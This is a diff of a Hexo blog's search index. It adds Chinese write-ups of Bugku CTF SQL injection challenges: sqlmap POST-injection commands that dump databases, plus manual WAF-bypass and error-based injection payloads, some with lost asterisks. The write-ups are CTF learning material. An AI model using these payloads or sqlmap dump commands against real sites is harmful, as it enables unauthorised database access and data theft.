@@ -1,45 +1,35 @@
 <?xml version="1.0" encoding="utf-8"?>
-<search> 
-  
-    
-    <entry>
-      <title>SQLMAP-POST注入</title>
-      <link href="/2018/08/17/SQLMAP-POST%E6%B3%A8%E5%85%A5/"/>
-      <url>/2018/08/17/SQLMAP-POST%E6%B3%A8%E5%85%A5/</url>
-      <content type="html"><![CDATA[<p>BUGKU-ctf作为国内著名的ctf联系靶场，拥有丰富的题型加强我们的ctf水平。下面就是一次我认为比较典型的sql post注入题型。</p><p><center><strong>抓包，复制出来打成一个txt文件</strong></center><br><img src="/2018/08/17/SQLMAP-POST注入/1.png" alt="抓包内容"></p><p><center><strong>sqlmap -r test.txt -p admin_name –dbs</strong></center><br>因为博主懒的没有在win环境下下载sqlmap，使用kali中自带sqlmap工具。下面简单解释一下工具命令。<br><img src="/2018/08/17/SQLMAP-POST注入/2.png" alt=""></p><ul><li><p>-r  指定一个文件。</p></li><li><p>-p 指定参数，如图我指定提交表单中的admin_name作为参数进行注入。</p></li><li><p>–dbs 爆出所有的数据库。</p></li></ul><p>点击回车运行，竟然发现无法进行sql注入！</p><p><img src="/2018/08/17/SQLMAP-POST注入/3.png" alt=""><br>上图是我进行注入失败，后面继续追加了下面的参数</p><ul><li><p>-v  这个是展现攻击测试的详细过程的程度，一般设为3就足够。</p></li><li><p>–threads 这个见词知意，为线程数，博主一般将此设为10，这个根据每个人的电脑配置，酌情增加。</p></li></ul><center><strong>sqlmap -r test.txt -p admin_name –dbs –threads 10 -v 3 –level 3</strong></center><p><img src="/2018/08/17/SQLMAP-POST注入/4.PNG" alt=""><br>如图，发现这个SQL注入并不是平常的单引号闭合，而是双引号闭合，而sqlmap只有在level=3时才会测试双引号。</p><p>解释参数：</p><ul><li>–level 这个参数表示sqlmap进行测试的程度，数值为1~5，一般将其设为3，因为如果你给的数值越大，代表工具会变慢，很容易影响进度。<br><center><strong>sqlmap -r test.txt -p admin_name -D bugkusql1 –threads 10 -v 3 –level 3 –table</strong></center><br><center><strong>sqlmap -r test.txt -p admin_name -D bugkusql1 –threads 10 -v 3 –level 3 -T flag1 -C flag1 –dump</strong></center><br>这些就是爆表，爆字段，跟平常的sqlmap使用并无区别，因此不再做详细解释。</li></ul><p>解释参数：</p><ul><li><p>-D 指定数据库。</p></li><li><p>-T  指定表。</p></li><li><p>–table  数据库爆表名。</p></li><li><p>–dump 显示所有字段。</p></li></ul><hr><p><a href="http://120.24.86.145:9001/sql/" target="_blank" rel="noopener">题目地址</a></p>]]></content>
-      
+<search>
+  <entry>
+    <title><![CDATA[SQL报错注入]]></title>
+    <url>%2F2018%2F08%2F17%2FSQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%2F</url>
+    <content type="text"><![CDATA[快草了两个月的bugku-web类型的题，感觉基本web类型都有了一些大概的了解，当然比不上dalao的掌控雷电的操作，后面就是多玩一会python了，毕竟CTF中脚本不会写是真的硬伤。 这道题是web-150分的题，看了一下网上的WP不多，我也是找了一堆资料，看了看相似的体型才把这道题做的差不多。 题名：多次，网址链接 首先打开网页看到id这个参数，很经典的SQL注入。于是测试单引号过滤?id=1’，页面发生变化，猜测位查询语句为单引号闭合。再次进行测试，?id=1′ or 1=1%23 ，发现并无变化。猜测可能有WAF过滤，于是测试双重写or，?id=1′ oorr 1=1%23 ，测试发现页面改变 进行测试过滤，使用异或符号（^）搭配length函数开始测试。 如何判断是否过滤，例如union函数没有过滤，那么length(‘union’)=0是不成立的，即该语句布尔值为0，并且前面的查询语句布尔值恒等于1，1^0=1，1^1=0。则为1返回正常页面，不正常返回错误页面。经测试：or，and，union，select被过滤。那么接下来就是常规测试。 ?id=1%27 oorrder by 2%23，测试列数为2。（注意order里面的or） 爆数据库?id=-1%27 uniounionn selecselectt 1,group_concat(schema_name) from infoorrmation_schema.schemata%23（坑点：information里面的or） 爆表?id=-1%27 uniounionn selecselectt 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=0x776562313030322d31（十六进制码为web1002-1）%23 爆出数据?id=-1%27 uniounionn selecselectt 1,flag1 from flag1 %23然后题目提示还有一个flag在下一关的地址。根据上面的操作，地址可能在address列里。 寻找下一关地址?id=-1%27 uniounionn selecselectt 1,address from flag1 %23 找到下一关地址OK，还是向上面的一样测试，发现还是单引号过滤。发现还是有回显我们测试的语句，突然发现这个WAF过滤的有点奇怪，这个过滤了union那我将union重写，发现直接不回显，可能是后端的专门对这种产生过滤。因为还发现有报错产生，那么我就进行报错盲注测试。 盲注测试公式：union select count(),concat(version(),floor(rand(0)2))x from information_schema.tables group by x; 其中version()改成相应的注入语句。公式需要灵活变通，例如本题中的union被过滤，那么将语句改为or and连接的形式，并且适当添加相应的列数。Ps：盲注相关原理在文章末尾链接。 or (select 1 from(select count(),concat(0x23,(select schema_name from information_schema.schemata limit 1,1),0x23,floor(rand(0)2))x from information_schema.schemata group by x)a)%23 因为不能用union进行注入，所以改变一下形式使用or，就这个走了好多弯路，因为or只能使用1个跟1个比，否则将会出错Operand should contain 1 column(s) , 且(select count(),concat(0x23,(select schema_name from information_schema.schemata limit 1,1),0x23,floor(rand(0)2))x from information_schema.schemata group by x)这条语句将会产生一个虚拟表，你在虚拟表进行查询时需要起一个别名，我在这里起的a，于是报错爆来数据库，下面的操作跟第一关一样。但是其中爆数据时产生了一些问题，说是子查询返回超过了一行但是猜测肯定是只有一行的，估计是出题人加了回车产生了换行。解决方法：left((select flag2 from flag2),40)，取前40个字符。 相关链接：https://blog.csdn.net/qq_35544379/article/details/77453019 https://blog.csdn.net/he_and/article/details/80455884 http://wyb0.com/ 两天时间全部花费在这个报错注入上，不过懂了好多SQL上的东西，也算是少有收获。]]></content>
       <categories>
-          
-          <category> CTF </category>
-          
+        <category>CTF</category>
       </categories>
-      
-      
-        <tags>
-            
-            <tag> kali </tag>
-            
-            <tag> SQLInjection </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    <entry>
-      <title>Hello World</title>
-      <link href="/2018/07/23/hello-world/"/>
-      <url>/2018/07/23/hello-world/</url>
-      <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
-      
-      
-        <tags>
-            
-            <tag> hexo </tag>
-            
-        </tags>
-      
-    </entry>
-    
-  
-  
+      <tags>
+        <tag>SQLinjection</tag>
+        <tag>手动注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[SQLMAP-POST注入]]></title>
+    <url>%2F2018%2F08%2F17%2FSQLMAP-POST%E6%B3%A8%E5%85%A5%2F</url>
+    <content type="text"><![CDATA[BUGKU-ctf作为国内著名的ctf联系靶场，拥有丰富的题型加强我们的ctf水平。下面就是一次我认为比较典型的sql post注入题型。 抓包，复制出来打成一个txt文件 sqlmap -r test.txt -p admin_name –dbs因为博主懒的没有在win环境下下载sqlmap，使用kali中自带sqlmap工具。下面简单解释一下工具命令。 -r 指定一个文件。 -p 指定参数，如图我指定提交表单中的admin_name作为参数进行注入。 –dbs 爆出所有的数据库。 点击回车运行，竟然发现无法进行sql注入！ 上图是我进行注入失败，后面继续追加了下面的参数 -v 这个是展现攻击测试的详细过程的程度，一般设为3就足够。 –threads 这个见词知意，为线程数，博主一般将此设为10，这个根据每个人的电脑配置，酌情增加。 sqlmap -r test.txt -p admin_name –dbs –threads 10 -v 3 –level 3 如图，发现这个SQL注入并不是平常的单引号闭合，而是双引号闭合，而sqlmap只有在level=3时才会测试双引号。 解释参数： –level 这个参数表示sqlmap进行测试的程度，数值为1~5，一般将其设为3，因为如果你给的数值越大，代表工具会变慢，很容易影响进度。sqlmap -r test.txt -p admin_name -D bugkusql1 –threads 10 -v 3 –level 3 –tablesqlmap -r test.txt -p admin_name -D bugkusql1 –threads 10 -v 3 –level 3 -T flag1 -C flag1 –dump这些就是爆表，爆字段，跟平常的sqlmap使用并无区别，因此不再做详细解释。 解释参数： -D 指定数据库。 -T 指定表。 –table 数据库爆表名。 –dump 显示所有字段。 题目地址]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>kali</tag>
+        <tag>SQLInjection</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Hello World]]></title>
+    <url>%2F2018%2F07%2F23%2Fhello-world%2F</url>
+    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
+      <tags>
+        <tag>hexo</tag>
+      </tags>
+  </entry>
 </search>
